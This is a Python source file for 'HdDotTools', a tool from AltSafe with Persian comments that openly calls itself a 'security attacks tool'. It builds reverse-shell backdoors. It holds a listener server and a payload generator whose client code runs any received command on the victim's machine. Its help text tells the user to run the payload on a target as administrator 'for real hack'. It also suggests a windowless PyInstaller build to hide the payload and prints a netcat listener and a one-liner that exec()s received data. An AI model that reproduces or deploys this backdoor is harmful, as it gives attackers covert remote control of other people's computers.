import time
import random
import os
import socket
import threading
import sys
from arts import art_1, art_2, art_3, art_4, art_5, art_7, art_8, art_9, art_10

# انتخاب تصادفی برای خوش‌آمدگویی
welcome_arts = [art_1, art_2, art_3, art_4, art_5, art_7, art_8, art_9, art_10]
welcome = random.choice(welcome_arts)

def clear():
    """پاک کردن صفحه ترمینال"""
    os.system("cls" if os.name == "nt" else "clear")

def n_l(a=1):
    """چاپ خطوط خالی"""
    for _ in range(a):
        print()

def az_ina():
    """انیمیشن لودینگ"""
    print("propering:", end="\r")
    frames = ["/", "|", "\\"]
    for _ in range(3):  # 3 دور کامل
        for frame in frames:
            print(f"propering: {frame}", end="\r")
            time.sleep(0.5)
    print("propering: done!")
    n_l(3)

def p_board():
    """نمایش صفحه شروع"""
    clear()
    welcome()
    n_l(3)
    print("       security attacks tool       ")
    print("       develops by AltSafe       ")
    print("       https://altsafe.net")
    print()
    print("   hddottools ver_1.0.1 by github:AltSafe")
    n_l(2)
    
    # انیمیشن شروع
    for dots in ["starting.", "starting..", "starting..."]:
        print(dots, end="\r")
        time.sleep(1)
    print("starting...")
    time.sleep(1.5)
    n_l()
    az_ina()

def show_help():
    """نمایش راهنما"""
    clear()
    help_text = """
   by      ___AltSafe.net___

                    backdoor (ReverseTCP shell):
    
   HdDotTools version 1.0.1
   hacks: just shell
   can download by https://altsafe.net
   

   --ip         for your ip to connect the client reverse shell
                like --ip 178.564.248.210
   
   --port       for the port do you want to connect client 
                like --port 4444 , recommended upper 1024
   
   --o          to output and save the your payload
                like --o C:\\User\\X\\Desktop\\project_1
   
   syntax       you must write :
                backdoor --ip 127.0.0.1 --port 4444 --o C:\\User\\Desktop\\X\\New folder
   
   logics       this app give you an \".Py\" file (payload)
                and you must first run the your server to ready connect client to you 
                after that you must the run the your payload to the target system
                and finally connected are successfully and you have access to the target shell
                recommended run the payload as adminstrator
                its better you write the your ip local or your ip general for real hack
                its better you write port upper 1024 like:
                4444 , 5555 , 1080 ,8080,...
                if don't know whats port is open dont worry. use the nmap tool
                or use the open systems port like 80,443,22,21,23
                if you want to hack in the local area network (LAN) your work its very easy
                just open the port of the your firewall computer and yeah is finally going
                else its close by superviser in (LAN) d

   startserver  you are server! . for start listening and you are ready to run the payload in client
                you should give this that ip and port you are use in the payload 
                you must be have that\'s ip 
                at the first give this that ip
                and the second give this that port 
                and make shore are you ready? type \"y\" and continou
   
   su           go to the create backdoor mood . you are now in backdoor mod and ready to create
                you should give this the ip you want to connect the client to you to access you to client
                you shold type:
                backdoor <--ip> (ip) <--port> (port) <--o> (save location)


        [!] Warning: for have backdoor and hack easy at the first you must be insert su in <hdt> and
                     you are going to <su> mode . after that insert
                     backdoor <--ip> (ip) <--port> (port) <--o> (save location)
                     and type \"y\" to make sure payload created and after insert 
                     hotkey CTRL + C or type back 
                     after that you are back in <hdt> mode and insert startserver
                     after that you shold insert thats ip and port you give to payload
                     after that insert \"y\" to start server and now
                     now you shold run the payload in client and client connect to server(you)
                     and you access the client shell 
                     
        [$$$] ENJOY
    """
    print(help_text)
    n_l(2)

def validate_ip(ip):
    """اعتبارسنجی آدرس IP"""
    try:
        parts = ip.split('.')
        if len(parts) != 4:
            return False
        for part in parts:
            if not 0 <= int(part) <= 255:
                return False
        return True
    except:
        return False

def get_local_ip():
    """دریافت IP محلی سیستم"""
    try:
        # ایجاد یک سوکت برای اتصال به یک سرور خارجی
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))  # استفاده از DNS گوگل
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except:
        return "127.0.0.1"

def is_valid_server_ip(ip):
    """بررسی اینکه آیا IP برای سرور معتبر است"""
    if ip == "0.0.0.0":
        return True  # 0.0.0.0 به معنای همه اینترفیس‌ها است
    elif ip == "127.0.0.1":
        return True  # localhost
    else:
        # بررسی اینکه آیا IP متعلق به سیستم است
        try:
            # دریافت IPهای محلی
            hostname = socket.gethostname()
            local_ips = socket.gethostbyname_ex(hostname)[2]
            
            # اضافه کردن 127.0.0.1
            local_ips.append("127.0.0.1")
            
            return ip in local_ips
        except:
            return False

class ReverseShellServer:
    def __init__(self, host='0.0.0.0', port=5555):
        self.host = host
        self.port = port
        self.server_socket = None
        self.client_socket = None
        self.client_address = None  
        self.is_running = False
        
    def start(self):
        """start server and waiting for connect client"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(1)
            
            print(f"[*] server are listening on {self.host}:{self.port}")
            print("[*] waiting for connect client")
            print("[!] Press Ctrl+C to stop the server")
            
            self.is_running = True
            self.client_socket, self.client_address = self.server_socket.accept()
            print(f"[+] connected of {self.client_address}")
            
            # شروع مدیریت دستورات
            self.handle_client()
            
        except KeyboardInterrupt:
            print("\n[!] server stopped by user")
        except socket.error as e:
            if e.errno == 10049:
                print(f"[-] Error: IP address '{self.host}' is not available on this system")
                print(f"[-] Try using one of these IPs:")
                print(f"    - 127.0.0.1 (localhost)")
                print(f"    - 0.0.0.0 (all interfaces)")
                try:
                    local_ip = get_local_ip()
                    print(f"    - {local_ip} (your local IP)")
                except:
                    pass
            else:
                print(f"[-] Socket error: {e}")
        except Exception as e:
            print(f"[-] error raise: {e}")
        finally:
            self.cleanup()
    
    def handle_client(self):
        """manage connect with client"""
        try:
            while True:
                # دریافت دستور از کاربر
                command = input("client => ")
                
                if command.lower() == 'exit':
                    self.client_socket.send(b'exit')
                    break
                elif command.strip() == '':
                    continue
                
                # ارسال دستور به کلاینت
                self.client_socket.send(command.encode())
                
                # دریافت پاسخ از کلاینت
                response = self.receive_data()
                if response:
                    print(response)
                    
        except KeyboardInterrupt:
            print("\n[!] disconnect by user")
        except Exception as e:
            print(f"[-] error raise with connect: {e}")
    
    def receive_data(self):
        """reserve data of client"""
        try:
            data = self.client_socket.recv(4096)
            return data.decode('utf-8', errors='ignore')
        except:
            return None
    
    def cleanup(self):
        """clear the databases"""
        if self.client_socket:
            self.client_socket.close()
        if self.server_socket:
            self.server_socket.close()
        self.is_running = False
        print("[*] disconnected")

def start_server_mode():
    """حالت راه‌اندازی سرور"""
    print("\n" + "="*50)
    print("SERVER MODE")
    print("="*50)
    
    # دریافت IP از کاربر
    local_ip = get_local_ip()
    print(f"[+] Your local IP: {local_ip}")
    print(f"[+] Localhost IP: 127.0.0.1")
    print(f"[+] All interfaces: 0.0.0.0")
    print()
    
    while True:
        ip = input("Enter server IP (default: 0.0.0.0): ").strip()
        if ip == "":
            ip = "0.0.0.0"
            break
        elif not validate_ip(ip):
            print("[-] Invalid IP address format. Please enter a valid IP (e.g., 192.168.1.1)")
        elif ip == "0.0.0.0":
            print("[!] Warning: 0.0.0.0 will listen on all network interfaces")
            break
        elif ip == "127.0.0.1":
            print("[!] Note: 127.0.0.1 will only accept connections from this computer")
            break
        elif not is_valid_server_ip(ip):
            print(f"[-] Warning: IP '{ip}' may not be available on this system")
            print(f"[-] Recommended IPs: 127.0.0.1, 0.0.0.0, or {local_ip}")
            confirm = input("Continue anyway? (y/n): ").strip().lower()
            if confirm == 'y' or confirm == 'yes':
                break
        else:
            break
    
    # دریافت پورت از کاربر
    while True:
        port_input = input("Enter server port (default: 5555): ").strip()
        if port_input == "":
            port = 5555
            break
        try:
            port = int(port_input)
            if 1 <= port <= 65535:
                if port < 1024:
                    print("[!] Warning: Ports below 1024 may require administrator privileges")
                break
            else:
                print("[-] Port must be between 1 and 65535")
        except ValueError:
            print("[-] Invalid port number. Please enter a number")
    
    print(f"\n[+] Server configuration:")
    print(f"    IP: {ip}")
    print(f"    Port: {port}")
    
    # نمایش اطلاعات اتصال
    if ip == "0.0.0.0":
        print(f"\n[!] Server will listen on ALL network interfaces")
        print(f"[!] Local connections: 127.0.0.1:{port}")
        print(f"[!] LAN connections: {local_ip}:{port}")
        print(f"[!] External connections: <your-public-ip>:{port}")
    elif ip == "127.0.0.1":
        print(f"\n[!] Server will ONLY accept connections from this computer")
        print(f"[!] Use 127.0.0.1:{port} for connections")
    else:
        print(f"\n[!] Server will listen on {ip}:{port}")
    
    print(f"\n[!] Make sure your firewall allows connections on port {port}")
    if ip != "127.0.0.1":
        print(f"[!] If using public IP, ensure port {port} is forwarded on your router")
    
    confirm = input("\nStart server? (y/n): ").strip().lower()
    if confirm == 'y' or confirm == 'yes':
        print("\n[+] Starting server...")
        time.sleep(1)
        
        try:
            server = ReverseShellServer(host=ip, port=port)
            server.start()
        except Exception as e:
            print(f"[-] Failed to start server: {e}")
    else:
        print("[*] Server start cancelled")

def parse_backdoor_command(cmd_input):
    """پارس کردن دستور بک‌دور"""
    parts = cmd_input.split()
    
    if len(parts) < 7:
        print("Error: Invalid command format")
        print("Usage: backdoor --ip <IP> --port <PORT> --o <OUTPUT_PATH>")
        return None
    
    try:
        # پیدا کردن اندیس‌ها
        ip_index = parts.index("--ip")
        port_index = parts.index("--port")
        output_index = parts.index("--o")
        
        # استخراج مقادیر
        ip = parts[ip_index + 1]
        port = parts[port_index + 1]
        output_path = parts[output_index + 1]
        
        # اگر مسیر پسوند .py ندارد، اضافه کن
        if not output_path.lower().endswith('.py'):
            output_path = output_path + '.py'
        
        return {
            "ip": ip,
            "port": port,
            "output_path": output_path
        }
    except (ValueError, IndexError):
        print("Error: Invalid command format")
        return None

def create_backdoor_payload(ip, port, output_path):
    """ایجاد فایل پیلود بک‌دور با IP و پورت مشخص شده"""
    
    # کد کلاینت با جایگزینی IP و پورت
    client_code = f'''import socket
import subprocess
import os
import sys
import time

def clear():
    os.system("cls")

class ReverseShellClient:
    def __init__(self, server_ip='{ip}', server_port={port}):
        self.server_ip = server_ip
        self.server_port = server_port
        self.socket = None
        
    def connect_to_server(self):
        """connect to server"""
        while True:
            try:
                clear()
                print("trying to connect... ")
                print("")
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.server_ip, self.server_port))
                print(f"[+] connected to  {{self.server_ip}}:{{self.server_port}}")
                return True
            except:
                print("[-] error raise with connect , reconnecting in 5...")
                time.sleep(1)
                print("[-] error raise with connect , reconnecting in 4...")
                time.sleep(1)
                print("[-] error raise with connect , reconnecting in 3...")
                time.sleep(1)
                print("[-] error raise with connect , reconnecting in 2...")
                time.sleep(1)
                print("[-] error raise with connect , reconnecting in 1...")
                time.sleep(1)
                print("[-] error raise with connect , reconnecting in 1...")
                print("")
    
    def execute_command(self, command):
        """run the command and return output"""
        try:
            # change directory
            if command.startswith('cd '):
                path = command[3:].strip()
                try:
                    os.chdir(path)
                    return f"change directory to: {{os.getcwd()}}"
                except Exception as e:
                    return f"error raise with change directory: {{e}}"
            
            # run the command system
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE
            )
            
            output = process.stdout.read() + process.stderr.read()
            return output.decode('utf-8', errors='ignore')
            
        except Exception as e:
            return f"error raise with run the command: {{e}}"
    
    def start(self):
        """start client"""
        if not self.connect_to_server():
            return
        
        try:
            while True:
                # دریافت دستور از سرور
                command = self.socket.recv(4096).decode('utf-8', errors='ignore')
                
                if command.lower() == 'exit':
                    break
                
                # اجرای دستور و ارسال نتیجه
                result = self.execute_command(command)
                self.socket.send(result.encode())
                
        except KeyboardInterrupt:
            print("\\n[!] disconnect")
        except Exception as e:
            print(f"[-] error raise: {{e}}")
        finally:
            if self.socket:
                self.socket.close()

if __name__ == "__main__":
    import time  # فقط برای کلاینت نیاز است
    
    client = ReverseShellClient(server_ip='{ip}', server_port={port})
    client.start()
'''
    
    try:
        # بررسی مسیر خروجی
        output_dir = os.path.dirname(output_path)
        if output_dir and not os.path.exists(output_dir):
            os.makedirs(output_dir)
            print(f"[+] Created directory: {output_dir}")
        
        # نوشتن کد در فایل
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(client_code)
        
        print(f"[+] Backdoor payload created successfully!")
        print(f"[+] File saved to: {output_path}")
        print(f"[+] IP: {ip}")
        print(f"[+] Port: {port}")
        print(f"[+] File size: {len(client_code)} bytes")
        
        # نمایش اطلاعات اضافی
        print(f"\n[+] File type: Python script (.py)")
        print(f"[+] You can run it with: python {os.path.basename(output_path)}")
        
        # پیشنهاد برای کامپایل به EXE (اختیاری)
        print("\n[!] Optional: To convert to EXE, you can use PyInstaller:")
        print(f"    pyinstaller --onefile --noconsole {output_path}")
        print("    or")
        print(f"    pyinstaller --onefile --windowed {output_path}  # بدون کنسول")
        
        return True
        
    except PermissionError:
        print(f"[-] Permission denied: Cannot write to {output_path}")
        print("[-] Try running as administrator or choose a different location")
        return False
    except Exception as e:
        print(f"[-] Error creating backdoor payload: {e}")
        return False

def su():
    """حالت super user برای ایجاد بک‌دور"""
    while True:
        try:
            user_input = input("backdoor> ").strip()
            
            if user_input == "":
                continue
            elif user_input == "help":
                show_help()
            elif user_input == "exit" or user_input == "back":
                print("Exiting backdoor mode...")
                break
            elif user_input.startswith("backdoor"):
                # پارس کردن دستور
                result = parse_backdoor_command(user_input)
                if result:
                    print(f"\n[+] Backdoor configuration:")
                    print(f"    IP: {result['ip']}")
                    print(f"    Port: {result['port']}")
                    print(f"    Output file: {result['output_path']}")
                    
                    # تایید از کاربر
                    confirm = input("\nAre you sure you want to create backdoor? (y/n): ").strip().lower()
                    if confirm == 'y' or confirm == 'yes':
                        print("\n[+] Creating backdoor payload...")
                        time.sleep(1)
                        
                        # ایجاد پیلود
                        success = create_backdoor_payload(
                            result['ip'], 
                            result['port'], 
                            result['output_path']
                        )
                        
                        if success:
                            print("\n[+] Backdoor creation completed!")
                            print("[!] Remember: You need to run a server to receive connections.")
                            print("[!] You can use netcat or create a simple Python server.")
                            print("\n[!] Server example (run this on your machine):")
                            print(f"    nc -lvp {result['port']}")
                            print("    or")
                            print("    python -c \"import socket;s=socket.socket();s.bind(('0.0.0.0',{result['port']}));s.listen(1);c,a=s.accept();print('Connected from:',a);exec(c.recv(4096).decode())\"")
                        else:
                            print("\n[-] Backdoor creation failed!")
                    else:
                        print("Backdoor creation cancelled.")
            else:
                print(f"'{user_input}' is not recognized as a valid command.")
                
        except KeyboardInterrupt:
            print("\nExiting...")
            break
        except Exception as e:
            print(f"Error: {e}")

def main_test_1():
    """حلقه اصلی برنامه"""
    while True:
        try:
            user_input = input("hdt> ").strip()
            
            if user_input == "clear":
                clear()
            elif user_input == "help":
                show_help()
            elif user_input == "":
                continue
            elif user_input == "backdoor":
                print("Type 'su' to enter backdoor creation mode, or 'help' for details")
            elif user_input == "su":
                su()
            elif user_input == "startserver":
                start_server_mode()
            elif user_input == "exit":
                print("Goodbye!")
                break
            else:
                print(f"'{user_input}' is not recognized as an internal or external command,")
                print("operable program or batch file.")
                
        except KeyboardInterrupt:
            print("\nExiting...")
            break
        except Exception as e:
            print(f"Error: {e}")

def main():
    """تابع اصلی اجرای برنامه"""
    p_board()
    main_test_1()

# if __name__ == "__main__":
#     main()
